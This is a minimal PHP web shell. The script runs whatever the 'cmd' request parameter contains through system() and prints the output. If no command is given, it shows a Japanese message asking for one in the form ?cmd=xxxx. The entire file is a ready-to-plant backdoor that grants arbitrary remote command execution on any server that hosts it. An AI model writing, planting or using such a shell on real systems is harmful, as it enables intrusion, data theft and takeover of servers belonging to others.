<?php
$cmd = empty($_REQUEST['cmd'])?   null:$_REQUEST['cmd'];

if($cmd !== null){
	echo system($cmd);
}
else{
	echo "コマンドを指定してください(?cmd=xxxx)";
}